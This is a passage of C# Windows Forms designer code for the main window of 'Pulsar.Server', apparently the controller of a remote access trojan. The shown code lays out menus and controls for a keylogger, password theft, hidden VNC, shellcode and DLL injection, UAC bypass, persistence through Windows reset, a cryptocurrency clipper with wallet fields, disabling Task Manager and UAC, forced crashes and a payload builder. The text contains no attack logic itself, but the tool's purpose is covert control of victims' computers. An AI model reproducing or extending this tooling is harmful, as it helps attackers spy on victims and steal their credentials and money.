using Pulsar.Server.Controls;
using System.Drawing;
using System.Windows.Forms;

namespace Pulsar.Server.Forms
{
    partial class FrmMain
    {
        /// <summary>
        /// Erforderliche Designervariable.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        /// Verwendete Ressourcen bereinigen.
        /// </summary>
        /// <param name="disposing">True, wenn verwaltete Ressourcen gelöscht werden sollen; andernfalls False.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing)
            {
                _notificationUnreadFont?.Dispose();
                _notificationUnreadFont = null;

                if (components != null && this.IsHandleCreated)
                {
                    components.Dispose();
                }
            }
            try
            {
                base.Dispose(disposing);
            } catch
            {
            }
            
        }

        #region Vom Windows Form-Designer generierter Code

        /// <summary>
        /// Erforderliche Methode für die Designerunterstützung.
        /// Der Inhalt der Methode darf nicht mit dem Code-Editor geändert werden.
        /// </summary>
        private void InitializeComponent()
        {
            components = new System.ComponentModel.Container();
            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(FrmMain));
            ListViewItem listViewItem1 = new ListViewItem("CPU");
            ListViewItem listViewItem2 = new ListViewItem("GPU");
            ListViewItem listViewItem3 = new ListViewItem("RAM");
            ListViewItem listViewItem4 = new ListViewItem("Uptime");
            ListViewItem listViewItem5 = new ListViewItem("Antivirus");
            ListViewItem listViewItem6 = new ListViewItem("Default Browser");
            ListViewItem listViewItem7 = new ListViewItem("Ping");
            ListViewItem listViewItem8 = new ListViewItem("Webcam");
            ListViewItem listViewItem9 = new ListViewItem("AFK Time");
            contextMenuStrip = new ContextMenuStrip(components);
            systemToolStripMenuItem = new ToolStripMenuItem();
            systemInformationToolStripMenuItem = new ToolStripMenuItem();
            fileManagerToolStripMenuItem = new ToolStripMenuItem();
            startupManagerToolStripMenuItem = new ToolStripMenuItem();
            taskManagerToolStripMenuItem = new ToolStripMenuItem();
            remoteShellToolStripMenuItem = new ToolStripMenuItem();
            connectionsToolStripMenuItem = new ToolStripMenuItem();
            reverseProxyToolStripMenuItem = new ToolStripMenuItem();
            registryEditorToolStripMenuItem = new ToolStripMenuItem();
            remoteExecuteToolStripMenuItem = new ToolStripMenuItem();
            ctxtLine = new ToolStripSeparator();
            actionsToolStripMenuItem = new ToolStripMenuItem();
            shutdownToolStripMenuItem = new ToolStripMenuItem();
            restartToolStripMenuItem = new ToolStripMenuItem();
            standbyToolStripMenuItem = new ToolStripMenuItem();
            lockScreenToolStripMenuItem = new ToolStripMenuItem();
            surveillanceToolStripMenuItem = new ToolStripMenuItem();
            remoteDesktopToolStripMenuItem2 = new ToolStripMenuItem();
            webcamToolStripMenuItem = new ToolStripMenuItem();
            remoteSystemAudioToolStripMenuItem = new ToolStripMenuItem();
            audioToolStripMenuItem = new ToolStripMenuItem();
            hVNCToolStripMenuItem = new ToolStripMenuItem();
            keyloggerToolStripMenuItem = new ToolStripMenuItem();
            passwordRecoveryToolStripMenuItem = new ToolStripMenuItem();
            userSupportToolStripMenuItem = new ToolStripMenuItem();
            remoteChatToolStripMenuItem = new ToolStripMenuItem();
            remoteScriptingToolStripMenuItem = new ToolStripMenuItem();
            showMessageboxToolStripMenuItem = new ToolStripMenuItem();
            visitWebsiteToolStripMenuItem = new ToolStripMenuItem();
            quickCommandsToolStripMenuItem = new ToolStripMenuItem();
            shellcodeRunnerToolStripMenuItem = new ToolStripMenuItem();
            injectDLLToolStripMenuItem = new ToolStripMenuItem();
            addCDriveExceptionToolStripMenuItem = new ToolStripMenuItem();
            taskManagerToolStripMenuItem1 = new ToolStripMenuItem();
            enableToolStripMenuItem = new ToolStripMenuItem();
            disableTaskManagerToolStripMenuItem = new ToolStripMenuItem();
            uACToolStripMenuItem = new ToolStripMenuItem();
            enableUACToolStripMenuItem = new ToolStripMenuItem();
            disableUACToolStripMenuItem = new ToolStripMenuItem();
            virtualMonitorToolStripMenuItem1 = new ToolStripMenuItem();
            installToolStripMenuItem = new ToolStripMenuItem();
            uninstallToolStripMenuItem1 = new ToolStripMenuItem();
            funMethodsToolStripMenuItem = new ToolStripMenuItem();
            bSODToolStripMenuItem = new ToolStripMenuItem();
            cWToolStripMenuItem = new ToolStripMenuItem();
            swapMouseButtonsToolStripMenuItem = new ToolStripMenuItem();
            hideTaskBarToolStripMenuItem = new ToolStripMenuItem();
            disableEnableKeyboardToolStripMenuItem = new ToolStripMenuItem();
            startToolStripMenuItem = new ToolStripMenuItem();
            stopToolStripMenuItem = new ToolStripMenuItem();
            monitorsToolStripMenuItem = new ToolStripMenuItem();
            allOffToolStripMenuItem = new ToolStripMenuItem();
            allOnToolStripMenuItem = new ToolStripMenuItem();
            cDTrayToolStripMenuItem = new ToolStripMenuItem();
            openToolStripMenuItem = new ToolStripMenuItem();
            closeToolStripMenuItem = new ToolStripMenuItem();
            connectionToolStripMenuItem = new ToolStripMenuItem();
            elevatedToolStripMenuItem = new ToolStripMenuItem();
            elevateClientPermissionsToolStripMenuItem = new ToolStripMenuItem();
            elevateToSystemToolStripMenuItem = new ToolStripMenuItem();
            deElevateFromSystemToolStripMenuItem = new ToolStripMenuItem();
            uACBypassToolStripMenuItem = new ToolStripMenuItem();
            winREToolStripMenuItem = new ToolStripMenuItem();
            installWinresetSurvivalToolStripMenuItem = new ToolStripMenuItem();
            removeWinresetSurvivalToolStripMenuItem = new ToolStripMenuItem();
            winRECustomFileForSurvivalToolStripMenuItem = new ToolStripMenuItem();
            nicknameToolStripMenuItem = new ToolStripMenuItem();
            blockIPToolStripMenuItem = new ToolStripMenuItem();
            updateToolStripMenuItem = new ToolStripMenuItem();
            reconnectToolStripMenuItem = new ToolStripMenuItem();
            disconnectToolStripMenuItem = new ToolStripMenuItem();
            uninstallToolStripMenuItem = new ToolStripMenuItem();
            lineToolStripMenuItem = new ToolStripSeparator();
            openClientFolderToolStripMenuItem = new ToolStripMenuItem();
            selectAllToolStripMenuItem = new ToolStripMenuItem();
            pluginManagerToolStripMenuItem = new ToolStripMenuItem();
            imgFlags = new ImageList(components);
            notifyIcon = new NotifyIcon(components);
            tableLayoutPanel = new TableLayoutPanel();
            MainTabControl = new NoButtonTabControl();
            tabOfflineClients = new TabPage();
            lstOfflineClients = new AeroListView();
            hOfflineIP = new ColumnHeader();
            hOfflineNickname = new ColumnHeader();
            hOfflineTag = new ColumnHeader();
            hOfflineUserPC = new ColumnHeader();
            hOfflineVersion = new ColumnHeader();
            hOfflineLastSeen = new ColumnHeader();
            hOfflineFirstSeen = new ColumnHeader();
            hOfflineCountry = new ColumnHeader();
            hOfflineOS = new ColumnHeader();
            hOfflineAccountType = new ColumnHeader();
            OfflineClientsContextMenuStrip = new ContextMenuStrip(components);
            removeOfflineClientsToolStripMenuItem = new ToolStripMenuItem();
            tabStats = new TabPage();
            statsElementHost = new StatsElementHost();
            tabPage1 = new TabPage();
            wpfClientsHost = new ClientsListElementHost();
            lstClients = new AeroListView();
            hIP = new ColumnHeader();
            hNick = new ColumnHeader();
            hTag = new ColumnHeader();
            hUserPC = new ColumnHeader();
            hVersion = new ColumnHeader();
            hStatus = new ColumnHeader();
            hCurrentWindow = new ColumnHeader();
            hUserStatus = new ColumnHeader();
            hCountry = new ColumnHeader();
            hOS = new ColumnHeader();
            hAccountType = new ColumnHeader();
            tableLayoutPanel1 = new TableLayoutPanel();
            label1 = new Label();
            pictureBoxMain = new PictureBox();
            tblLayoutQuickButtons = new TableLayoutPanel();
            btnQuickListenToMicrophone = new Button();
            btnQuickRemoteDesktop = new Button();
            btnQuickWebcam = new Button();
            btnQuickKeylogger = new Button();
            btnQuickFileTransfer = new Button();
            btnQuickRemoteShell = new Button();
            btnQuickFileExplorer = new Button();
            chkDisablePreview = new CheckBox();
            gBoxClientInfo = new GroupBox();
            clientInfoListView = new AeroListView();
            Names = new ColumnHeader();
            Stats = new ColumnHeader();
            DebugLogRichBox = new RichTextBox();
            DebugContextMenuStrip = new ContextMenuStrip(components);
            saveLogsToolStripMenuItem = new ToolStripMenuItem();
            saveSlectedToolStripMenuItem = new ToolStripMenuItem();
            toolStripSeparator1 = new ToolStripSeparator();
            clearLogsToolStripMenuItem = new ToolStripMenuItem();
            splitter1 = new Splitter();
            tabHeatMap = new TabPage();
            heatMapElementHost = new HeatMapElementHost();
            tabPage2 = new TabPage();
            lstNoti = new AeroListView();
            columnHeader1 = new ColumnHeader();
            columnHeader2 = new ColumnHeader();
            columnHeader3 = new ColumnHeader();
            columnHeader11 = new ColumnHeader();
            NotificationContextMenuStrip = new ContextMenuStrip(components);
            addKeywordsToolStripMenuItem = new ToolStripMenuItem();
            clearSelectedToolStripMenuItem = new ToolStripMenuItem();
            notificationStatusPanel = new Panel();
            lblNotificationStatus = new Label();
            tabPage3 = new TabPage();
            cryptoGroupBox = new GroupBox();
            BCHTextBox = new TextBox();
            label10 = new Label();
            TRXTextBox = new TextBox();
            label9 = new Label();
            XRPTextBox = new TextBox();
            label8 = new Label();
            DASHTextBox = new TextBox();
            label7 = new Label();
            SOLTextBox = new TextBox();
            label6 = new Label();
            XMRTextBox = new TextBox();
            label5 = new Label();
            LTCTextBox = new TextBox();
            label4 = new Label();
            ETHTextBox = new TextBox();
            label3 = new Label();
            BTCTextBox = new TextBox();
            label2 = new Label();
            ClipperCheckbox = new CheckBox();
            tabPage4 = new TabPage();
            lstTasks = new AeroListView();
            columnHeader4 = new ColumnHeader();
            columnHeader5 = new ColumnHeader();
            columnHeader8 = new ColumnHeader();
            TasksContextMenuStrip = new ContextMenuStrip(components);
            addTaskToolStripMenuItem = new ToolStripMenuItem();
            remoteExecuteToolStripMenuItem1 = new ToolStripMenuItem();
            shellCommandToolStripMenuItem = new ToolStripMenuItem();
            kematianToolStripMenuItem = new ToolStripMenuItem();
            showMessageBoxToolStripMenuItem1 = new ToolStripMenuItem();
            excludeSystemDriveToolStripMenuItem = new ToolStripMenuItem();
            winREToolStripMenuItem1 = new ToolStripMenuItem();
            deleteTasksToolStripMenuItem = new ToolStripMenuItem();
            statusStrip = new StatusStrip();
            listenToolStripStatusLabel = new ToolStripStatusLabel();
            connectedToolStripStatusLabel = new ToolStripStatusLabel();
            menuStrip = new MenuStrip();
            clientsToolStripMenuItem = new ToolStripMenuItem();
            offlineClientsToolStripMenuItem = new ToolStripMenuItem();
            clearOfflineClientsToolStripMenuItem = new ToolStripMenuItem();
            statsToolStripMenuItem = new ToolStripMenuItem();
            mapToolStripMenuItem = new ToolStripMenuItem();
            autoTasksToolStripMenuItem = new ToolStripMenuItem();
            cryptoClipperToolStripMenuItem = new ToolStripMenuItem();
            notificationCentreToolStripMenuItem = new ToolStripMenuItem();
            aboutToolStripMenuItem = new ToolStripMenuItem();
            settingsToolStripMenuItem = new ToolStripMenuItem();
            builderToolStripMenuItem = new ToolStripMenuItem();
            contextMenuStrip.SuspendLayout();
            tableLayoutPanel.SuspendLayout();
            MainTabControl.SuspendLayout();
            tabOfflineClients.SuspendLayout();
            OfflineClientsContextMenuStrip.SuspendLayout();
            tabStats.SuspendLayout();
            tabPage1.SuspendLayout();
            tableLayoutPanel1.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)pictureBoxMain).BeginInit();
            tblLayoutQuickButtons.SuspendLayout();
            gBoxClientInfo.SuspendLayout();
            DebugContextMenuStrip.SuspendLayout();
            tabHeatMap.SuspendLayout();
            tabPage2.SuspendLayout();
            NotificationContextMenuStrip.SuspendLayout();
            notificationStatusPanel.SuspendLayout();
            tabPage3.SuspendLayout();
            cryptoGroupBox.SuspendLayout();
            tabPage4.SuspendLayout();
            TasksContextMenuStrip.SuspendLayout();
            statusStrip.SuspendLayout();
            menuStrip.SuspendLayout();
            SuspendLayout();
            // 
            // contextMenuStrip
            // 
            contextMenuStrip.Items.AddRange(new ToolStripItem[] { systemToolStripMenuItem, surveillanceToolStripMenuItem, userSupportToolStripMenuItem, quickCommandsToolStripMenuItem, funMethodsToolStripMenuItem, connectionToolStripMenuItem, lineToolStripMenuItem, openClientFolderToolStripMenuItem, selectAllToolStripMenuItem });
            contextMenuStrip.Name = "ctxtMenu";
            contextMenuStrip.Size = new Size(180, 186);
            contextMenuStrip.Opening += contextMenuStrip_Opening;
            // 
            // systemToolStripMenuItem
            // 
            systemToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[] { systemInformationToolStripMenuItem, fileManagerToolStripMenuItem, startupManagerToolStripMenuItem, taskManagerToolStripMenuItem, remoteShellToolStripMenuItem, connectionsToolStripMenuItem, reverseProxyToolStripMenuItem, registryEditorToolStripMenuItem, remoteExecuteToolStripMenuItem, ctxtLine, actionsToolStripMenuItem });
            systemToolStripMenuItem.Image = Properties.Resources.cog;
            systemToolStripMenuItem.Name = "systemToolStripMenuItem";
            systemToolStripMenuItem.Size = new Size(179, 22);
            systemToolStripMenuItem.Text = "Administration";
            systemToolStripMenuItem.Click += systemToolStripMenuItem_Click;
            // 
            // systemInformationToolStripMenuItem
            // 
            systemInformationToolStripMenuItem.Image = (Image)resources.GetObject("systemInformationToolStripMenuItem.Image");
            systemInformationToolStripMenuItem.Name = "systemInformationToolStripMenuItem";
            systemInformationToolStripMenuItem.Size = new Size(180, 22);
            systemInformationToolStripMenuItem.Text = "System Information";
            systemInformationToolStripMenuItem.Click += systemInformationToolStripMenuItem_Click;
            // 
            // fileManagerToolStripMenuItem
            // 
            fileManagerToolStripMenuItem.Image = (Image)resources.GetObject("fileManagerToolStripMenuItem.Image");
            fileManagerToolStripMenuItem.Name = "fileManagerToolStripMenuItem";
            fileManagerToolStripMenuItem.Size = new Size(180, 22);
            fileManagerToolStripMenuItem.Text = "File Manager";
            fileManagerToolStripMenuItem.Click += fileManagerToolStripMenuItem_Click;
            // 
            // startupManagerToolStripMenuItem
            // 
            startupManagerToolStripMenuItem.Image = Properties.Resources.application_edit;
            startupManagerToolStripMenuItem.Name = "startupManagerToolStripMenuItem";
            startupManagerToolStripMenuItem.Size = new Size(180, 22);
            startupManagerToolStripMenuItem.Text = "Startup Manager";
            startupManagerToolStripMenuItem.Click += startupManagerToolStripMenuItem_Click;
            // 
            // taskManagerToolStripMenuItem
            // 
            taskManagerToolStripMenuItem.Image = Properties.Resources.application_cascade;
            taskManagerToolStripMenuItem.Name = "taskManagerToolStripMenuItem";
            taskManagerToolStripMenuItem.Size = new Size(180, 22);
            taskManagerToolStripMenuItem.Text = "Task Manager";
            taskManagerToolStripMenuItem.Click += taskManagerToolStripMenuItem_Click;
            // 
            // remoteShellToolStripMenuItem
            // 
            remoteShellToolStripMenuItem.Image = (Image)resources.GetObject("remoteShellToolStripMenuItem.Image");
            remoteShellToolStripMenuItem.Name = "remoteShellToolStripMenuItem";
            remoteShellToolStripMenuItem.Size = new Size(180, 22);
            remoteShellToolStripMenuItem.Text = "Remote Shell";
            remoteShellToolStripMenuItem.Click += remoteShellToolStripMenuItem_Click;
            // 
            // connectionsToolStripMenuItem
            // 
            connectionsToolStripMenuItem.Image = Properties.Resources.transmit_blue;
            connectionsToolStripMenuItem.Name = "connectionsToolStripMenuItem";
            connectionsToolStripMenuItem.Size = new Size(180, 22);
            connectionsToolStripMenuItem.Text = "TCP Connections";
            connectionsToolStripMenuItem.Click += connectionsToolStripMenuItem_Click;
            // 
            // reverseProxyToolStripMenuItem
            // 
            reverseProxyToolStripMenuItem.Image = Properties.Resources.server_link;
            reverseProxyToolStripMenuItem.Name = "reverseProxyToolStripMenuItem";
            reverseProxyToolStripMenuItem.Size = new Size(180, 22);
            reverseProxyToolStripMenuItem.Text = "Reverse Proxy";
            reverseProxyToolStripMenuItem.Click += reverseProxyToolStripMenuItem_Click;
            // 
            // registryEditorToolStripMenuItem
            // 
            registryEditorToolStripMenuItem.Image = Properties.Resources.registry;
            registryEditorToolStripMenuItem.Name = "registryEditorToolStripMenuItem";
            registryEditorToolStripMenuItem.Size = new Size(180, 22);
            registryEditorToolStripMenuItem.Text = "Registry Editor";
            registryEditorToolStripMenuItem.Click += registryEditorToolStripMenuItem_Click;
            // 
            // remoteExecuteToolStripMenuItem
            // 
            remoteExecuteToolStripMenuItem.Image = Properties.Resources.lightning;
            remoteExecuteToolStripMenuItem.Name = "remoteExecuteToolStripMenuItem";
            remoteExecuteToolStripMenuItem.Size = new Size(180, 22);
            remoteExecuteToolStripMenuItem.Text = "Remote Execute";
            remoteExecuteToolStripMenuItem.Click += remoteExecuteToolStripMenuItem_Click;
            // 
            // ctxtLine
            // 
            ctxtLine.Name = "ctxtLine";
            ctxtLine.Size = new Size(177, 6);
            // 
            // actionsToolStripMenuItem
            // 
            actionsToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[] { shutdownToolStripMenuItem, restartToolStripMenuItem, standbyToolStripMenuItem, lockScreenToolStripMenuItem });
            actionsToolStripMenuItem.Image = Properties.Resources.actions;
            actionsToolStripMenuItem.Name = "actionsToolStripMenuItem";
            actionsToolStripMenuItem.Size = new Size(180, 22);
            actionsToolStripMenuItem.Text = "Actions";
            // 
            // shutdownToolStripMenuItem
            // 
            shutdownToolStripMenuItem.Image = Properties.Resources.shutdown;
            shutdownToolStripMenuItem.Name = "shutdownToolStripMenuItem";
            shutdownToolStripMenuItem.Size = new Size(180, 22);
            shutdownToolStripMenuItem.Text = "Shutdown";
            shutdownToolStripMenuItem.Click += shutdownToolStripMenuItem_Click;
            // 
            // restartToolStripMenuItem
            // 
            restartToolStripMenuItem.Image = Properties.Resources.restart;
            restartToolStripMenuItem.Name = "restartToolStripMenuItem";
            restartToolStripMenuItem.Size = new Size(180, 22);
            restartToolStripMenuItem.Text = "Restart";
            restartToolStripMenuItem.Click += restartToolStripMenuItem_Click;
            // 
            // standbyToolStripMenuItem
            // 
            standbyToolStripMenuItem.Image = Properties.Resources.standby;
            standbyToolStripMenuItem.Name = "standbyToolStripMenuItem";
            standbyToolStripMenuItem.Size = new Size(180, 22);
            standbyToolStripMenuItem.Text = "Standby";
            standbyToolStripMenuItem.Click += standbyToolStripMenuItem_Click;
            // 
            // lockScreenToolStripMenuItem
            // 
            lockScreenToolStripMenuItem.Image = Properties.Resources.lockscreenicon;
            lockScreenToolStripMenuItem.Name = "lockScreenToolStripMenuItem";
            lockScreenToolStripMenuItem.Size = new Size(180, 22);
            lockScreenToolStripMenuItem.Text = "Lock Screen";
            lockScreenToolStripMenuItem.Click += lockScreenToolStripMenuItem_Click;
            // 
            // surveillanceToolStripMenuItem
            // 
            surveillanceToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[] { remoteDesktopToolStripMenuItem2, webcamToolStripMenuItem, remoteSystemAudioToolStripMenuItem, audioToolStripMenuItem, hVNCToolStripMenuItem, keyloggerToolStripMenuItem, passwordRecoveryToolStripMenuItem });
            surveillanceToolStripMenuItem.Image = Properties.Resources.monitoring;
            surveillanceToolStripMenuItem.Name = "surveillanceToolStripMenuItem";
            surveillanceToolStripMenuItem.Size = new Size(179, 22);
            surveillanceToolStripMenuItem.Text = "Monitoring";
            // 
            // remoteDesktopToolStripMenuItem2
            // 
            remoteDesktopToolStripMenuItem2.Image = (Image)resources.GetObject("remoteDesktopToolStripMenuItem2.Image");
            remoteDesktopToolStripMenuItem2.Name = "remoteDesktopToolStripMenuItem2";
            remoteDesktopToolStripMenuItem2.Size = new Size(191, 22);
            remoteDesktopToolStripMenuItem2.Text = "Remote Desktop";
            remoteDesktopToolStripMenuItem2.Click += remoteDesktopToolStripMenuItem_Click;
            // 
            // webcamToolStripMenuItem
            // 
            webcamToolStripMenuItem.Image = Properties.Resources.webcam;
            webcamToolStripMenuItem.Name = "webcamToolStripMenuItem";
            webcamToolStripMenuItem.Size = new Size(191, 22);
            webcamToolStripMenuItem.Text = "Webcam";
            webcamToolStripMenuItem.Click += webcamToolStripMenuItem_Click;
            // 
            // remoteSystemAudioToolStripMenuItem
            // 
            remoteSystemAudioToolStripMenuItem.Image = Properties.Resources.sound;
            remoteSystemAudioToolStripMenuItem.Name = "remoteSystemAudioToolStripMenuItem";
            remoteSystemAudioToolStripMenuItem.Size = new Size(191, 22);
            remoteSystemAudioToolStripMenuItem.Text = "Remote System Audio";
            remoteSystemAudioToolStripMenuItem.Click += remoteSystemAudioToolStripMenuItem_Click;
            // 
            // audioToolStripMenuItem
            // 
            audioToolStripMenuItem.Image = Properties.Resources.pcmicrophone;
            audioToolStripMenuItem.Name = "audioToolStripMenuItem";
            audioToolStripMenuItem.Size = new Size(191, 22);
            audioToolStripMenuItem.Text = "Remote Microphone";
            audioToolStripMenuItem.Click += audioToolStripMenuItem_Click;
            // 
            // hVNCToolStripMenuItem
            // 
            hVNCToolStripMenuItem.Image = Properties.Resources.vncicon;
            hVNCToolStripMenuItem.Name = "hVNCToolStripMenuItem";
            hVNCToolStripMenuItem.Size = new Size(191, 22);
            hVNCToolStripMenuItem.Text = "HVNC";
            hVNCToolStripMenuItem.Click += hVNCToolStripMenuItem_Click;
            // 
            // keyloggerToolStripMenuItem
            // 
            keyloggerToolStripMenuItem.Image = Properties.Resources.keyboard_magnify;
            keyloggerToolStripMenuItem.Name = "keyloggerToolStripMenuItem";
            keyloggerToolStripMenuItem.Size = new Size(191, 22);
            keyloggerToolStripMenuItem.Text = "Keylogger";
            keyloggerToolStripMenuItem.Click += keyloggerToolStripMenuItem_Click;
            // 
            // passwordRecoveryToolStripMenuItem
            // 
            passwordRecoveryToolStripMenuItem.Image = (Image)resources.GetObject("passwordRecoveryToolStripMenuItem.Image");
            passwordRecoveryToolStripMenuItem.Name = "passwordRecoveryToolStripMenuItem";
            passwordRecoveryToolStripMenuItem.Size = new Size(191, 22);
            passwordRecoveryToolStripMenuItem.Text = "Password Recovery";
            passwordRecoveryToolStripMenuItem.Click += passwordRecoveryToolStripMenuItem_Click;
            // 
            // userSupportToolStripMenuItem
            // 
            userSupportToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[] { remoteChatToolStripMenuItem, remoteScriptingToolStripMenuItem, showMessageboxToolStripMenuItem, visitWebsiteToolStripMenuItem });
            userSupportToolStripMenuItem.Image = Properties.Resources.user;
            userSupportToolStripMenuItem.Name = "userSupportToolStripMenuItem";
            userSupportToolStripMenuItem.Size = new Size(179, 22);
            userSupportToolStripMenuItem.Text = "User Support";
            // 
            // remoteChatToolStripMenuItem
            // 
            remoteChatToolStripMenuItem.Image = Properties.Resources.phone;
            remoteChatToolStripMenuItem.Name = "remoteChatToolStripMenuItem";
            remoteChatToolStripMenuItem.Size = new Size(171, 22);
            remoteChatToolStripMenuItem.Text = "Remote Chat";
            remoteChatToolStripMenuItem.Click += remoteChatToolStripMenuItem_Click;
            // 
            // remoteScriptingToolStripMenuItem
            // 
            remoteScriptingToolStripMenuItem.Image = Properties.Resources.script_code;
            remoteScriptingToolStripMenuItem.Name = "remoteScriptingToolStripMenuItem";
            remoteScriptingToolStripMenuItem.Size = new Size(171, 22);
            remoteScriptingToolStripMenuItem.Text = "Remote Scripting";
            remoteScriptingToolStripMenuItem.Click += remoteScriptingToolStripMenuItem_Click;
            // 
            // showMessageboxToolStripMenuItem
            // 
            showMessageboxToolStripMenuItem.Image = (Image)resources.GetObject("showMessageboxToolStripMenuItem.Image");
            showMessageboxToolStripMenuItem.Name = "showMessageboxToolStripMenuItem";
            showMessageboxToolStripMenuItem.Size = new Size(171, 22);
            showMessageboxToolStripMenuItem.Text = "Show Messagebox";
            showMessageboxToolStripMenuItem.Click += showMessageboxToolStripMenuItem_Click;
            // 
            // visitWebsiteToolStripMenuItem
            // 
            visitWebsiteToolStripMenuItem.Image = (Image)resources.GetObject("visitWebsiteToolStripMenuItem.Image");
            visitWebsiteToolStripMenuItem.Name = "visitWebsiteToolStripMenuItem";
            visitWebsiteToolStripMenuItem.Size = new Size(171, 22);
            visitWebsiteToolStripMenuItem.Text = "Send to Website";
            visitWebsiteToolStripMenuItem.Click += visitWebsiteToolStripMenuItem_Click;
            // 
            // quickCommandsToolStripMenuItem
            // 
            quickCommandsToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[] { shellcodeRunnerToolStripMenuItem, injectDLLToolStripMenuItem, addCDriveExceptionToolStripMenuItem, taskManagerToolStripMenuItem1, uACToolStripMenuItem, virtualMonitorToolStripMenuItem1 });
            quickCommandsToolStripMenuItem.Image = Properties.Resources.wrench;
            quickCommandsToolStripMenuItem.Name = "quickCommandsToolStripMenuItem";
            quickCommandsToolStripMenuItem.Size = new Size(179, 22);
            quickCommandsToolStripMenuItem.Text = "Miscellaneous";
            // 
            // shellcodeRunnerToolStripMenuItem
            // 
            shellcodeRunnerToolStripMenuItem.Image = Properties.Resources.shellcodeicon;
            shellcodeRunnerToolStripMenuItem.Name = "shellcodeRunnerToolStripMenuItem";
            shellcodeRunnerToolStripMenuItem.Size = new Size(194, 22);
            shellcodeRunnerToolStripMenuItem.Text = "Inject Shellcode";
            shellcodeRunnerToolStripMenuItem.Click += shellcodeRunnerToolStripMenuItem_Click;
            // 
            // injectDLLToolStripMenuItem
            // 
            injectDLLToolStripMenuItem.Image = Properties.Resources.dllinjectoricon;
            injectDLLToolStripMenuItem.Name = "injectDLLToolStripMenuItem";
            injectDLLToolStripMenuItem.Size = new Size(194, 22);
            injectDLLToolStripMenuItem.Text = "Inject DLL";
            injectDLLToolStripMenuItem.Click += injectDLLToolStripMenuItem_Click;
            // 
            // addCDriveExceptionToolStripMenuItem
            // 
            addCDriveExceptionToolStripMenuItem.Image = Properties.Resources.application_view_xp_terminal;
            addCDriveExceptionToolStripMenuItem.Name = "addCDriveExceptionToolStripMenuItem";
            addCDriveExceptionToolStripMenuItem.Size = new Size(194, 22);
            addCDriveExceptionToolStripMenuItem.Text = "Add C: Drive Exception";
            addCDriveExceptionToolStripMenuItem.Click += addCDriveExceptionToolStripMenuItem_Click;
            // 
            // taskManagerToolStripMenuItem1
            // 
            taskManagerToolStripMenuItem1.DropDownItems.AddRange(new ToolStripItem[] { enableToolStripMenuItem, disableTaskManagerToolStripMenuItem });
            taskManagerToolStripMenuItem1.Image = Properties.Resources.cog;
            taskManagerToolStripMenuItem1.Name = "taskManagerToolStripMenuItem1";
            taskManagerToolStripMenuItem1.Size = new Size(194, 22);
            taskManagerToolStripMenuItem1.Text = "Task Manager";
            // 
            // enableToolStripMenuItem
            // 
            enableToolStripMenuItem.Image = Properties.Resources.cog_add;
            enableToolStripMenuItem.Name = "enableToolStripMenuItem";
            enableToolStripMenuItem.Size = new Size(188, 22);
            enableToolStripMenuItem.Text = "Enable Task Manager";
            enableToolStripMenuItem.Click += enableToolStripMenuItem_Click;
            // 
            // disableTaskManagerToolStripMenuItem
            // 
            disableTaskManagerToolStripMenuItem.Image = Properties.Resources.cog_delete;
            disableTaskManagerToolStripMenuItem.Name = "disableTaskManagerToolStripMenuItem";
            disableTaskManagerToolStripMenuItem.Size = new Size(188, 22);
            disableTaskManagerToolStripMenuItem.Text = "Disable Task Manager";
            disableTaskManagerToolStripMenuItem.Click += disableTaskManagerToolStripMenuItem_Click;
            // 
            // uACToolStripMenuItem
            // 
            uACToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[] { enableUACToolStripMenuItem, disableUACToolStripMenuItem });
            uACToolStripMenuItem.Image = Properties.Resources.uac_shield;
            uACToolStripMenuItem.Name = "uACToolStripMenuItem";
            uACToolStripMenuItem.Size = new Size(194, 22);
            uACToolStripMenuItem.Text = "UAC";
            // 
            // enableUACToolStripMenuItem
            // 
            enableUACToolStripMenuItem.Image = Properties.Resources.uac_shield;
            enableUACToolStripMenuItem.Name = "enableUACToolStripMenuItem";
            enableUACToolStripMenuItem.Size = new Size(139, 22);
            enableUACToolStripMenuItem.Text = "Enable UAC";
            enableUACToolStripMenuItem.Click += enableUACToolStripMenuItem_Click;
            // 
            // disableUACToolStripMenuItem
            // 
            disableUACToolStripMenuItem.Image = Properties.Resources.uac_shield;
            disableUACToolStripMenuItem.Name = "disableUACToolStripMenuItem";
            disableUACToolStripMenuItem.Size = new Size(139, 22);
            disableUACToolStripMenuItem.Text = "Disable UAC";
            disableUACToolStripMenuItem.Click += disableUACToolStripMenuItem_Click;
            // 
            // virtualMonitorToolStripMenuItem1
            // 
            virtualMonitorToolStripMenuItem1.DropDownItems.AddRange(new ToolStripItem[] { installToolStripMenuItem, uninstallToolStripMenuItem1 });
            virtualMonitorToolStripMenuItem1.Image = Properties.Resources.virtualmonitoricon;
            virtualMonitorToolStripMenuItem1.Name = "virtualMonitorToolStripMenuItem1";
            virtualMonitorToolStripMenuItem1.Size = new Size(194, 22);
            virtualMonitorToolStripMenuItem1.Text = "Virtual Monitor";
            // 
            // installToolStripMenuItem
            // 
            installToolStripMenuItem.Image = Properties.Resources.application_go;
            installToolStripMenuItem.Name = "installToolStripMenuItem";
            installToolStripMenuItem.Size = new Size(120, 22);
            installToolStripMenuItem.Text = "Install";
            installToolStripMenuItem.Click += installToolStripMenuItem_Click;
            // 
            // uninstallToolStripMenuItem1
            // 
            uninstallToolStripMenuItem1.Image = Properties.Resources.application_delete;
            uninstallToolStripMenuItem1.Name = "uninstallToolStripMenuItem1";
            uninstallToolStripMenuItem1.Size = new Size(120, 22);
            uninstallToolStripMenuItem1.Text = "Uninstall";
            uninstallToolStripMenuItem1.Click += uninstallToolStripMenuItem1_Click;
            // 
            // funMethodsToolStripMenuItem
            // 
            funMethodsToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[] { bSODToolStripMenuItem, cWToolStripMenuItem, swapMouseButtonsToolStripMenuItem, hideTaskBarToolStripMenuItem, disableEnableKeyboardToolStripMenuItem, monitorsToolStripMenuItem, cDTrayToolStripMenuItem });
            funMethodsToolStripMenuItem.Image = Properties.Resources.emoticon_evilgrin;
            funMethodsToolStripMenuItem.Name = "funMethodsToolStripMenuItem";
            funMethodsToolStripMenuItem.Size = new Size(179, 22);
